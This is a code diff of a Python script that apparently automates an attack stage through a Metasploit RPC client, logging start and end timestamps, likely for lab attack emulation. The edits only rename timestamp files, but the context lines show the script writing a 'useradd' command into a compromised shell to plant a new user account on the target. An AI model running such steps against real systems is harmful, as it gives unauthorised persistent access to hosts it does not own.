@@ -8,6 +8,8 @@ def record_timestamp(folder, output_time_file):
     output_time_file = os.path.join(folder, output_time_file)
     with open(output_time_file, "w+") as fw:
         fw.write('%f' % time.time())
+
+
 def main(argv):
     if len(argv) != 6:
         print("Usage: {} Folder local_ip target_ip".format(argv[0]))
@@ -21,7 +23,7 @@ def main(argv):
     client = MsfRpcClient('kali')
 
     time.sleep(2)
-    output_time_file = 'time_stage_5_start.txt'
+    output_time_file = 'time_step_5_start.txt'
     record_timestamp(folder, output_time_file)
     time.sleep(2)
 
@@ -31,7 +33,7 @@ def main(argv):
     shell.write('useradd -p $(openssl passwd -1 {0}) {1}'.format(new_user_password, new_user_account))
 
     time.sleep(10)
-    output_time_file = 'time_stage_5_end.txt'
+    output_time_file = 'time_step_5_end.txt'
     record_timestamp(folder, output_time_file)
     time.sleep(2)
 
